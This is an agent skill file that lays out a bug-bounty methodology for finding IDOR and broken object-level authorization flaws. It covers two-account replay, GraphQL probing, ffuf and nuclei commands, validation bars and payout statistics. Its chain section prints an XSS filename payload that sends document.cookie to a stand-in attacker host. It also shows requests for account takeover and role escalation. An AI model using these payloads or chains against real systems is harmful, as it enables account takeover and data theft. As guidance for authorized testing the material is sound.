---
name: bbhunt-idor
description: "Use when object IDs, user IDs, tenant IDs or record references appear in paths, query strings, bodies or headers, and when cross-account access is possible. Unified from 4 upstream skills (cbh, h1skills, hunting, research). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# IDOR / Broken Object-Level Authorization — unified methodology

> **Unified skill.** Built from 4 upstream skills across cbh, h1skills, hunting, research and the local HackerOne corpus. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Corpus-backed method (this class)

1. Create two accounts (and a second tenant where applicable) before testing. Record each object ID with its owner.
2. Enumerate every endpoint that accepts an identifier: read, update, delete, duplicate, export, and bulk variants.
3. Replay the exact request with victim IDs using the attacker session. Test horizontal (same role) and vertical (lower role -> higher) access separately.
4. Test all verbs — a read may be protected while PUT/DELETE on the same route is not.
5. Probe nested and derived references: parent IDs in the body, filenames, import/export packages, and IDs in webhook payloads.
6. Check for authorization by absence: if a missing/unknown ID returns a different error than a known foreign ID, that is an enumeration oracle worth documenting.
7. Prove cross-user impact with redacted evidence from your own second account; quantify how many objects are exposed.

### Signals

- Sequential/guessable IDs, UUIDs in URLs, or IDs inside JWT claims
- Export, invoice, attachment, order, shipment, or profile endpoints
- Nested resources where parent ownership is not checked
- Bulk operations accepting arrays of IDs

### Kill criteria

- The object belongs to the same account you control — self-IDOR.
- The victim ID is not obtainable by an attacker without privileged access.
- Foreign ID returns the same generic not-found as a random ID and no data or state changes.

### Escalation chains

- Read IDOR -> write/delete on the same object -> data modification.
- IDOR on export -> bulk PII extraction -> mass disclosure.
- IDOR on role/membership object -> privilege escalation -> full tenant access.

### Veteran tip

Cross-account replay is the most frequent technique in the valid IDOR writeups. Without a second identity, mark the unit blocked rather than guessing.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Collect every identifier from responses, exports, emails, JS bundles, and mobile APIs.
- Replay the same request with a second account and with no auth; compare status, length, and body.
- Test list/search/export/batch endpoints, not only detail pages.
- Try nested resources: /org/1/user/2, /invoice/9/line/1, and composite IDs.
- Check file downloads and signed-URL generation for object substitution.

### Deeper checklist

- Collect every object identifier from responses, exports, emails, and JS bundles.
- Swap IDs across two accounts and across tenants; test sequential, UUID, and hashed IDs.
- Try ID formats: numeric +-1, UUID v1, base64, slug, composite keys, nested IDs.
- Check list, search, export, and batch endpoints, not just detail endpoints.
- Test file/download endpoints and signed URL generation for object substitution.
- Look for authorization based only on the parent object (nested resource IDOR).
- Confirm cross-account data access with a second controlled account.

### Step-by-Step Hunting Methodology

1. **Map all object references in the application**
   - Browse every feature authenticated as User A
   - Capture all requests in Burp Suite
   - Filter for requests containing: `id=`, `_id=`, `uuid=`, `/v1/{noun}/{id}`, query params with numeric/UUID values

2. **Enumerate ID types**
   - Sequential integers → enumerate ±1, ±100
   - UUIDs → check if they appear in other responses or JS files
   - Hashed IDs → check if leaked in public endpoints, metadata, or GraphQL introspection

3. **Create two separate accounts (same privilege level)**
   - User A: resource owner
   - User B: attacker account
   - Log all IDs belonging to User A while authenticated as User A

4. **Replay User A's resource IDs as User B**
   - Replace session cookie/token with User B's credentials
   - Send identical requests referencing User A's object IDs
   - Test ALL HTTP verbs: GET, POST, PUT, PATCH, DELETE on each endpoint

5. **Test cross-tenant/cross-org scenarios**
   - Create accounts in separate organizations/businesses
   - Test if Org B's session can reference Org A's IDs
   - Pay special attention to admin/management endpoints

6. **Test GraphQL specifically**
   - Run introspection: `{ __schema { queryType { fields { name } } } }`
   - For every query/mutation taking an `id` argument, substitute another user's ID
   - Test both queries (read) and mutations (write/delete)

7. **Test write/destructive operations, not just reads**
   - Can User B DELETE User A's resources?
   - Can User B MODIFY User A's content?
   - Can User B ADD themselves to User A

### Web-Research Methodology Additions (2026)

Sourced from OWASP API Security Top 10 (API1:2023 BOLA), the OWASP IDOR Prevention Cheat Sheet, a 2026 multi-account testing guide, and the Bugcrowd IDOR methodology (see D). Extends the chain library already in this skill with current discovery/validation discipline.

### A. Discovery checklist — concrete places, parameters, headers, file types, and workflows to look for this bug class

- **OWASP's three ingredients:** an object, a reference to it (ID/UUID/account number/token/slug), and a missing object-level authorization check. Exposing an ID is not the bug; the missing check is. Tag as CWE-639 (child of CWE-863).
- **Where references hide (DeepStrike table):** URL path `/api/users/123/settings`; query `?account=88231`; JSON/form body `"order_id": 5520` or a hidden `<input name="user_id">`; **headers/cookies** `X-Account-Id`, `X-User-ID`, `X-UID`, account cookies; GraphQL `node(id:)` / mutation args; **nested resources** `/orders/77/items/3` (parent checked, child not); file/export names `/downloads/invoice-2026-0042.pdf`; async jobs `/reports/status?job=af31…`; **batch endpoints** `/api/bulk?ids=1,2,3` where each member of the list must be checked.
- **Four types to map (ACSC/CISA/NSA AA23-208A):** horizontal (peer's data), vertical (higher-privilege record), object-level (modify/delete someone else's object), function-level (invoke an action reserved for another role). The last two shade into BFLA.
- **Account setup:** at least two same-role accounts (A owner, B attacker), a user C in a second tenant for multi-tenant apps, one account per privileged role, plus an unauthenticated session. Create test objects for each so ownership ground truth is known.
- **Burp workflow (Bugcrowd):** browse every feature while proxying; use the HTTP History + scope "Show only in-scope items"; use a normal tab for user A and an incognito/secret tab fo

### Part 5 — Methodology (step by step)

1. **Map all object references** in the application. Browse every feature as User A, capture all requests in Burp, filter for `id=`, `_id=`, `uuid=`, `/v1/{noun}/{id}`, and query params with numeric/UUID values.
2. **Enumerate ID types** (§1.2) — sequential, UUIDv1/v4, base64, Hashids, composite, GID.
3. **Create two separate accounts at the same privilege level.** User A = resource owner; User B = attacker. Log all IDs belonging to A while authenticated as A.
4. **Replay A's resource IDs as B.** Replace session cookie/token with B's credentials, send identical requests referencing A's object IDs. Test all HTTP verbs on each endpoint.
5. **Test cross-tenant / cross-org scenarios.** Create accounts in separate organizations and test whether Org B's session can reference Org A's IDs — especially admin/management endpoints.
6. **Test GraphQL specifically** (§4) — introspection, `node(id:)`, field-level IDOR, aliases, mutations.
7. **Test write / destructive operations, not just reads.** Can B delete A's resources? Modify A's content? Add themselves to A's account?
8. **Chain IDORs together.** One IDOR's leaked data (org IDs, user IDs) fuels the next → privilege escalation.
9. **Test state-changing edge cases.** Expired tokens/invites that can still be accepted; race conditions; indirect refs (`?sort=id`, `?filter[user_id]=`).
10. **Document the exact differential.** Confirm B has no legitimate access to A's resource; screenshot the 200 OK vs expected 403/404.

Then run the pre-report gate (above) and, if chaining, Part 6.

---

### Signals and surfaces

### Signal

- Reports: **450** · paid: **107**
- Median bounty **$500** · p90 **$5,000** · max **$20,000** · total **$199,099**
- Median upvotes **31**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 12 | $44,550 | 858 |
| Mail.ru | 37 | $24,260 | 971 |
| New Relic | 18 | $19,250 | 379 |
| HackerOne | 20 | $18,000 | 3370 |
| Snapchat | 1 | $15,000 | 801 |
| Reddit | 7 | $10,500 | 813 |
| PayPal | 1 | $10,500 | 797 |
| GitHub | 6 | $10,000 | 657 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`id` `user_id` `account_id` `org_id` `team_id` `order_id` `invoice_id` `file_id` `message_id` `project_id` `tenant` `uuid`

### Crown Jewel Targets

**Why IDOR pays big:**
- Direct access to other users' data without authentication bypass — clear, demonstrable impact
- Chains easily with privilege escalation, financial fraud, and account takeover
- Affects virtually every application with user-owned resources

**Highest-value asset types (by payout potential):**

| Asset Type | Why It Pays |
|---|---|
| Financial documents / billing APIs | PII + financial data exposure (Shopify, Uber, PayPal) |
| Private repositories / source code | IP theft, critical data loss (GitHub) |
| User messages / DMs | Privacy violation at scale (Reddit) |
| Account management endpoints | User addition, deletion, privilege escalation (PayPal, Mozilla) |
| Business/org administration | Cross-tenant escalation, employee PII (Uber) |
| Content moderation/admin actions | Operational sabotage (Reddit mod logs) |

**Programs that pay most for IDOR:**
- Platforms with multi-tenancy (SaaS, B2B tools)
- Fintech and payment processors
- Social platforms with private content
- Developer tools with org/repo isolation

---

### Attack Surface Signals

**URL patterns that scream IDOR:**
```
/api/v1/users/{id}/
/api/v*/orders/{order_id}
/invoices/download?id=
/reports/{uuid}/
/messages/{thread_id}
/admin/orgs/{org_id}/members
/migration/{migration_id}/files
/graphql (query params with IDs)
/api/business/{business_id}/
/vouchers/{voucher_id}/policy
```

**Response header signals:**
- `Content-Type: application/json` on endpoints accepting raw IDs
- No `X-Frame-Options` or CORS misconfigs paired with ID params
- `Authorization: Bearer` tokens that are user-scoped but hit org-level resources

**JavaScript source patterns:**
```javascript
// Look for hardcoded or interpolated IDs in JS
fetch(`/api/v1/users/${userId}/profile`)
axios.get('/invoices/' + invoiceId)
graphql query { billingDocument(id: $docId) }
// Redux/state stores exposing foreign IDs
state.currentUser.organizationId
```

**Tech stack signals:**
- GraphQL endpoints (query-based IDORs are often missed)
- REST APIs with sequential integer IDs (most vulnerable)
- UUIDs that are predictable or leaked in other responses
- Multi-tenant SaaS apps with `org_id`, `account_id`, `business_id` params
- Mobile apps (Burp the APK — mobile APIs often skip authorization checks)

---

### Where it pays (450-report corpus)

| Program | Reports | Bounty | Upvotes |
|---|---:|---:|---:|
| GitLab | 12 | $44,550 | 858 |
| Mail.ru | 37 | $24,260 | 971 |
| New Relic | 18 | $19,250 | 379 |
| HackerOne | 20 | $18,000 | 3370 |
| Snapchat | 1 | $15,000 | 801 |
| Reddit | 7 | $10,500 | 813 |
| PayPal | 1 | $10,500 | 797 |
| GitHub | 6 | $10,000 | 657 |

_...and 2 more sections in `references/unified-method.md`._

### Techniques, payloads and bypasses

### Payloads & probes

- Numeric -> id=1 -> id=2, id=0, id=-1, id=999999
- UUID/hash -> swap a known UUID from another account; try UUIDv1 timestamps.
- Encoded -> base64 decode/encode, hex, JWT sub, gid://app/Model/123
- Batch -> `{"ids":[1,2,3]}` or repeated `id=1&id=2`
- Nested -> `/users/1/orders/2` with user 1 but order 2

### Bypass tricks

- Swap GET/POST/PUT/PATCH/DELETE; try method override headers and `_method`.
- Move the ID from body to query, path, or header; try JSON arrays and duplicate keys.
- Test hidden fields and mass assignment on owner/org/role/account fields.
- GraphQL: query other users' nodes, aliases, and nested connections directly.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Delete anyone's content spotlight remotely.** — `#1819832` · Snapchat · $15,000 · ▲801
  > {"operationName":"DeleteStorySnaps","variables":{"ids":["███████"],"storyType":"SPOTLIGHT STORY"},"query":"mutation DeleteStorySnaps($ids: [String!]!, $storyType: StoryType!) {\n deleteStorySnaps(ids: $ids, storyType: $storyType)\n}\n"}
- **IDOR allows user to access report details via reference.json endpoint** — `#3862641` · HackerOne · $15,000 · ▲372
  > By sending a POST request to the `/reports/{report id}/reference.json` endpoint with an empty JSON body `{}`, VDP users could retrieve information about private reports belonging to other programs despite receiving an access-denied error.
- **Insecure Direct Object Reference (IDOR) - Delete Campaigns** — `#1969141` · HackerOne · $0 · ▲346
  > At the campaign id parameter in the request change it to another program's ongoing campaign id parameter.
- **Attachment disclosure via summary report** — `#2442008` · HackerOne · $0 · ▲340
  > or in gdrive, if yt can't be seen yet : https://███████
- **Arbitrary Read of Another Users private repository without Authorization** — `#3124517` · GitHub · $10,000 · ▲276
  > [CVE-2025-8447](https://www.cve.org/cverecord?id=CVE-2025-8447)
- **Deleting all DMs on RedditGifts.com** — `#1213237` · Reddit · $5,000 · ▲267
  > Change cookies/csrf token and `4423007` to your own message ID
- **Insecure Direct Object Reference (IDOR) Allows Viewing Private Re

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 4× | `MembershipRequest::getMembership()` |
| 4× | `link()` |
| 3× | `victim@email.com` |
| 3× | `MembershipService::getMembership()` |
| 2× | `Move to > My Content` |
| 2× | `application%5Bid%5D` |
| 2× | `curl --request POST \ / --url 'https://gitlab.domain.com/api/v4/projects/<ATTACKID>/merge_requests/1/status_check_responses?sha=<SHA>&extern` |
| 2× | `/BugReport/Admin/Attachment/{id}` |
| 2× | `attacker@email.com` |
| 2× | `{attacker-email}` |
| 2× | `curl -X GET "http://localhost:8080/ocs/v2.php/apps/circles/link/r2gmJl8n5xKWecQaVYe1dP3h6nqIUDk/ovYvboLMBNGvRXSkqhgllIKo6T7fvZl" \ / -H "OCS` |
| 2× | `getMembership()` |
| 2× | `LocalController::link()` |
| 1× | `POST /reports/[TEST_REPORT_ID]/reference.json HTTP/2 / Host: hackerone.com / Cookie: [your session cookie] / Content-Type: application/json` |
| 1× | `/reports/{id}/reference.json` |
| 1× | `/reports/{report_id}/reference.json` |
| 1× | `https://app.crowdsignal.com/users/invite-user.php?id=(userid)&popup=1` |
| 1× | `<PUT_VICTIM_EMAIL_HERE>` |
| 1× | `exmaple: GET /api/v1/users/@hasn0xxxx` |
| 1× | `GET /attachments/938540538 HTTP/1.1 / X-Signal-Agent: OWA / Accept-Encoding: gzip, deflate / X-Client-Version: BCM Android/5.1 Model/generic` |

### Common Root Causes

1. **Missing ownership check in ORM queries**
   ```javascript
   // VULNERABLE: fetches any record
   const invoice = await Invoice.findById(req.params.id);
   
   // SECURE: scopes to authenticated user
   const invoice = await Invoice.findOne({ _id: req.params.id, userId: req.user.id });
   ```

2. **Authorization at the route level, not object level**
   - Developer checks "is user logged in?" but not "does this user own this object?"
   - Middleware confirms authentication; individual handlers skip ownership validation

3. **Trusting client-supplied IDs in request bodies**
   - Mobile apps or SPAs send `org_id` in POST body; server uses it directly without verifying caller belongs to that org

4. **GraphQL resolvers without field-level authorization**
   - Query resolvers fetch by ID from database without checking if the requesting user has permission
   - Especially common when resolvers are auto-generated from schema

5. **Inconsistent authorization across HTTP verbs**
   - GET endpoint is protected; POST/DELETE on same resource path is not
   - Common in APIs built incrementally by different developers

6. **Indirect references exposed via related objects**
   - Object A (accessible) contains a reference to Object B (should be private)
   - Developer only protects direct access to B, not indirect references through A

7. **Race conditions and state-based IDORs**
   - Authorization checked at creation time, not at access time
   - Invites/tokens remain valid after the granting permission is revoked

8. **Multi-tenant isolation failures**
   - 

### Operator-level pattern

When you confirm a read-IDOR at A, immediately ask: *what state-change accepts the same ID and might also be IDOR'd?* The chain is usually one of: (1) password reset / email change at terminal step → ATO; (2) refund / withdraw / transfer → financial; (3) role-change / membership-add → privilege escalation. If your read-IDOR doesn't compose to one of those, the standalone payout is what you get. Hunt for both halves — the second is often easier to find because it shares the same auth bug class as the first.

Cross-references:
- `account-takeover` — Chain 1, 5
- `xss` — Chain 2
- `graphql` — Chains 3, 4
- `misc` — Chain 5
- `logic-and-design` — Chain 6

---

_...and 11 more sections in `references/unified-method.md`._

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   Be specific: "Attacker with a valid account can send a GET request to `/api/v1/invoices/{victim_invoice_id}` and receive the victim's full billing document including name, address, and payment amount — without any relationship to that account."

2. **What does the victim LOSE?**
   Map to CIA triad: confidentiality (data exposed), integrity (data modified), or availability (data deleted). "Victim loses confidentiality of private financial records" or "Victim's content is deleted by a third party" — vague answers fail.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Two fresh accounts created ✓
   - Exact HTTP request documented with victim's ID ✓
   - 200 OK response showing victim's data (or confirmed state change) ✓
   - No reliance on pre-existing state or timing ✓
   
   If you can't demo it reproducibly, do not file the report.

---

### C. Validation / proof bar — how to confirm the bug and avoid false positives

- **Role matrix evidence:** for each object type × action (read, create, update, delete, export, share, approve), record expected allow/deny, then replay every deny cell across A, B, C, and no session. A finding is a deny cell that returns data or changes state.
- **Body-diff the 200:** the #1 N/A driver is "returns 200 but no data" (empty array, redacted fields, "access denied" in body). Confirm the response actually contains the other user's data or a real state change — not merely a success status.
- **Ownership ground truth:** state the account used, the object owner, the exact request/response pair, and the expected matrix cell. Create the victim object yourself in the test account so there is no ambiguity about who owns it.
- **Deny-by-default check:** a correct fix returns 403 **or** 404; 404 is preferable when existence is sensitive (OWASP Spring example maps both missing and unauthorized to 404). If the "fixed" endpoint returns 200 with a different body, retest.
- **Negative controls:** show the same request with B's session on B's own object works (proves the session is valid) and with A's session on B's object is denied (proves the check exists elsewhere). This rules out a global "endpoint is broken" explanation.
- **Stay safe:** use only your own test accounts/data, stop at proof, do not enumerate real users. Scanners cannot prove this class — the exploiting request looks perfectly valid — so manual multi-account evidence is the bar (OWASP/AA23-208A).
- **Normalize before the check

### Part 12 — Reporting bar

- Prove real impact on a second controlled account (or a safe callback where applicable).
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Show the differential — victim's data returned under attacker session, or confirmed state change.
- Never report a 200-with-no-data IDOR — body-diff against a legitimate own-object response first.
- Attribute the sink — if several parameters/endpoints could be the cause, isolate one per request so the client patches the right field.
- Stay inside program scope and follow disclosure rules.

---

### Escalation and related chains

### Escalation chains

- IDOR read -> PII exposure.
- IDOR write -> account takeover.
- IDOR + mass assignment -> privilege escalation.

### Chains & Compositions (Senior Hunting)

Standalone IDOR gets paid at Low-Medium for cross-tenant *read*. The real money is in chaining IDOR to a *state-change* primitive that doesn't normally permit cross-tenant action — turning "I can see victim's data" into "I own victim's account". The six chains below are the highest-paying IDOR compositions on modern bug-bounty programs.

### Chain 1 — IDOR on `/api/users/{id}/email` + Missing Re-Auth → Password Reset → ATO

- **A.** Confirm IDOR on the email-change endpoint — request `PUT /api/users/{victim_id}/email {"email":"attacker@evil"}` from attacker's session; server changes the victim's email without ownership check.
- **B.** Hit the password-reset flow on the victim's account — server emails reset link to the **new** email (attacker's).
- **C.** Open reset link, set new password, log in as victim.
- **Impact:** Silent ATO — victim sees no email change notification because the change happens via API not via the user-facing "change email" UI which has its own audit log.
- **Real shape:** Classic ATO pattern across many SaaS bug-bounty disclosures 2018-2024. Cross-refs `account-takeover` Path 2 (email change without re-auth).

### Chain 2 — IDOR on File-Download + Filename-Controlled `Content-Disposition` → Reflected-XSS-Via-Download → Session Theft

- **A.** IDOR on `/api/files/{id}/download` returns any user's file given the ID.
- **B.** The download endpoint sets `Content-Disposition: attachment; filename="<user-supplied-filename>"` without sanitising newlines or quotes — attacker uploads a file with filename `"; <script>fetch('https://attacker/x?c='+document.cookie)</script>; foo.txt`.
- **C.** Victim navigates to download → browser interprets the injected script in the response header context as HTML → JS runs same-origin → cookie/token exfil.
- **Impact:** ATO via IDOR + filename-controlled response header — neither primitive alone is critical; the chain is.
- **Real shape:** Multiple disclosed cases involving Office 365 SharePoint download endpoints, GitLab attachment downloads, SaaS export endpoints. Pairs with `xss` Chain 1 (response-header XSS class).

### Chain 3 — IDOR via GraphQL `node(id:)` GID + Relay Relation Traversal → Cross-Tenant Mass Data Extraction

- **A.** Target uses GraphQL with Relay-style global IDs (`gid://shopify/Customer/<n>` or base64-encoded `type:id` patterns).
- **B.** `node(id:"<victim_gid>") { ... on Customer { email orders { totalPrice paymentMethods { cardLast4 } } } }` — the top-level `node()` resolver auths the requester, but nested relations don't re-check ownership against the resolved Customer.
- **C.** Iterate IDs (decoding base64 to extract numeric, incrementing) to exfil emails, order totals, payment methods across the entire customer base.
- **Impact:** Mass cross-tenant PII / financial data extraction. Single bug, full database.
- **Real shape:** Shopify Billing IDOR H1 #2207248 ($5,000); HackerOne PolicyPageAssetGroup IDOR H1 #1618347 ($25,000). Cross-refs `graphql` Disclosed Report Citation #5 and #2.

### Chain 4 — IDOR on `/api/teams/{id}/members` + Mass-Assignment in Body → Role Escalation on Victim Team

- **A.** Standard horizontal IDOR — `POST /api/teams/{victim_team_id}/members {"email":"attacker@evil"}` adds attacker as a normal member without ownership check.
- **B.** The body accepts additional fields the API didn't filter: `{"email":"attacker@evil", "role":"OWNER", "permissions":["*"]}` — mass assignment leaks into the role field.
- **C.** Attacker is added to the victim team as OWNER. Now has full admin access to the victim team's resources and can remove the real owners.
- **Impact:** Cross-tenant privilege escalation via IDOR + mass assignment. The single most efficient takeover chain on SaaS team-management APIs.
- **Real shape:** Shopify undocumented `fileCopy` mutation H1 #981472 (2020, $2,000); Stripe `UpdateAtlasApplicationPerson` cross-tenant mutation H1 #1066203 (2020). Cross-refs `graphql` Disclosed Report Citation #7 and #8; pairs with `api-misconfig` Mass Assignment section.

_...and 12 more sections in `references/unified-method.md`._

### Tools and wordlists

### Tools

`Autorize` · `Burp Repeater` · `ffuf` · `mitmproxy` · `Postman`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_idor.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_idor.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_idor.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_idor.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Nuclei only finds exposed objects; the real work is cross-account replay with two identities.

```sh
nuclei -u https://target -tags idor,exposure \
       -severity low,medium,high,critical -rl 40 -o nuclei_idor.txt
nuclei -u https://target -t ~/nuclei-templates/http/exposures \
       -rl 40 -o nuclei_idor_exposures.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### 2.9 Source-code grep patterns

```bash
# Missing authorization checks in common frameworks
grep -r "findById\|findOne\|getById" --include="*.js" .
grep -r "params\[:id\]\|params\['id'\]" --include="*.rb" .
grep -r "request\.args\.get\('id'\)" --include="*.py" .

# Direct ORM queries without user scoping
grep -r "Model\.find(params" --include="*.js" .
# secure pattern:  Model.find({ id: params.id, userId: req.user.id })
```

### 9.1 Tools

Autorize (Burp ext — auto-replays with a second user's session) · AuthMatrix (multi-role testing) · AuthAnalyzer (token swapping) · Burp Repeater · ffuf · mitmproxy · Postman · graphw00f · clairvoyance · inql · graphql-cop · GraphQLmap

### 9.2 Wordlists

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_idor.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_idor.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_idor.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_idor.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

_...and 1 more sections in `references/unified-method.md`._

## Source skills merged into this topic

- `h1skills` — `hackerone-idor`
- `hunting` — `idor`
- `research` — `hunt-idor`
- `cbh` — `hunt-idor`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/upstream-assets/` — 2 companion files (payload/technique references, scripts, validators and schemas) from the contributing skills
- `../../upstream/` — complete unmodified archives of all five source repositories
- `references/evidence.md` — corpus technique frequencies, parameters, case studies and payload bank
- `bbhunt-methodology` — orchestrator, state machine and class router
